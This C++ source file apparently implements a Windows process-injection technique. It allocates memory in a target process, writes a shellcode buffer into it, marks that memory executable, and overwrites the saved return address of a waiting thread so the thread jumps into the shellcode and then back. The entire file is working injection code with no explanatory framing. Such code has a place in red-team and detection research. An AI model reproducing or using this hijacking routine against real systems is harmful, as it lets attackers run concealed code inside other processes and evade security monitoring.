#include "hijacking.h"

#include <psapi.h>

#include <iostream>
#include <sstream>

#include "ntdll_api.h"
#include "ntddk.h"

#include "threads_util.h"

bool protect_memory(DWORD pid, LPVOID mem_ptr, SIZE_T mem_size, DWORD protect)
{
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, pid);
    if (!hProcess) return false;

    DWORD oldProtect = 0;
    BOOL isOk = ntapi::VirtualProtectEx(hProcess, (LPVOID)mem_ptr, mem_size, protect, &oldProtect);
    CloseHandle(hProcess);
    return isOk;
}

HMODULE get_module_by_address(LPVOID ret)
{
    if (IsBadReadPtr(ret, sizeof(DWORD))) {
        return (HMODULE)NULL; //not mapped in the current process, probably the implanted shellcode
    }
    HMODULE mod = NULL;
    if (GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCSTR)ret, &mod)) {
        std::cout << "Address: " << std::hex << ret << " found in module: " << std::hex << mod;
        char base_name[MAX_PATH] = { 0 };
        if (GetModuleBaseNameA(GetCurrentProcess(), mod, base_name, MAX_PATH)) {
            std::cout << " : " << base_name;
        }
        std::cout << "\n";
    }
    return mod;
}

bool check_ret_target(LPVOID ret)
{
    HMODULE mod = get_module_by_address((LPVOID)ret);
    if (mod == NULL) {
        std::cout << "Pointer not in any recognized module.\n";
        return false;
    }
    if (mod == GetModuleHandleA("ntdll.dll") ||
        mod == GetModuleHandleA("kernelbase.dll") ||
        mod == GetModuleHandleA("kernel32.dll"))
    {
        return true;
    }
    std::cout << "Pointer not in ntdll/kernel32.\n";
    return false;
}

bool run_injected(DWORD pid, ULONGLONG shellcodePtr, size_t shellcodeSize, DWORD wait_reason)
{
    std::cout << "Enumerating threads of PID: " << pid << "\n";
    std::map<DWORD, threads_util::thread_info> threads_info;
    if (!threads_util::fetch_threads_info(pid, threads_info)) {
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess) return false;

    CONTEXT ctx = { 0 };
    ULONGLONG suitable_ret_ptr = 0;
    ULONGLONG suitable_ret = 0;
    std::cout << "Threads: " << threads_info.size() << std::endl;
    for (auto itr = threads_info.begin(); itr != threads_info.end(); ++itr) {
        threads_util::thread_info& info = itr->second;

        if (!info.is_extended) return false;

        if (info.ext.state == Waiting) {
            std::cout << "TID: " << info.tid << std::hex << " : wait reason: " << std::dec << info.ext.wait_reason << "\n";
            if (wait_reason != WAIT_REASON_UNDEFINED // if wait reason defined
                && info.ext.wait_reason != wait_reason)
            {
                continue;
            }
            if (!threads_util::read_context(info.tid, ctx)) {
                continue;
            }
            ULONGLONG ret = threads_util::read_return_ptr<ULONGLONG>(hProcess, ctx.Rsp);
            std::cout << "RET: " << std::hex << ret << "\n";
            if (!suitable_ret_ptr) {
                if (!check_ret_target((LPVOID)ret)) {
                    std::cout << "Not supported ret target. Skipping!\n";
                    continue;
                }
                suitable_ret_ptr = ctx.Rsp;
                suitable_ret = ret;
                std::cout << "\tUsing as a target!\n";
                break;
            }
        }
        else {
            std::cout << "TID: " << itr->first << "is NOT waiting, State: " << info.ext.state << "\n";
        }
    }
    bool is_injected = false;
    if (suitable_ret_ptr) {
        // overwrite the shellcode with the jump back
        SIZE_T written = 0;
        if (ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, &suitable_ret, sizeof(suitable_ret), &written) && written == sizeof(suitable_ret)) {
            std::cout << "Shellcode ptr overwritten! Written: " << written << " \n";
        }
        else {
            std::cout << "Failed to overwrite shellcode jmp back: " << std::hex << GetLastError() << "\n";
            return false;
        }
        if (!protect_memory(pid, (LPVOID)shellcodePtr, shellcodeSize, PAGE_EXECUTE_READ)) {
            std::cerr << "Failed making memory executable!\n";
            return false;
        }

        shellcodePtr += 0x8; // after the saved return...
        std::cout << "Trying to overwrite: " << std::hex << suitable_ret_ptr << " -> " << suitable_ret << " with: " << shellcodePtr << std::endl;
        if (ntapi::WriteProcessMemory(hProcess, (LPVOID)suitable_ret_ptr, &shellcodePtr, sizeof(shellcodePtr), &written) && written == sizeof(shellcodePtr)) {
            std::cout << "Ret overwritten!\n";
            is_injected = true;
        }
    }
    CloseHandle(hProcess);
    return is_injected;
}

LPVOID alloc_memory_in_process(DWORD processID, const size_t shellcode_size)
{
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, processID);
    if (!hProcess) return nullptr;

    LPVOID shellcodePtr = ntapi::VirtualAllocEx(hProcess, nullptr, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    CloseHandle(hProcess);
    return shellcodePtr;
}

bool write_buf_into_process(DWORD processID, LPVOID shellcodePtr, const BYTE *shellc_buf, const size_t shellc_size)
{
    if (!shellcodePtr) return false;

    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, processID);
    if (!hProcess) return false;

    SIZE_T written = 0;
    bool isOk = ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, (LPVOID)shellc_buf, shellc_size, &written);
    CloseHandle(hProcess);
    if (isOk && written == shellc_size) {
        return true;
    }
    return false;
}
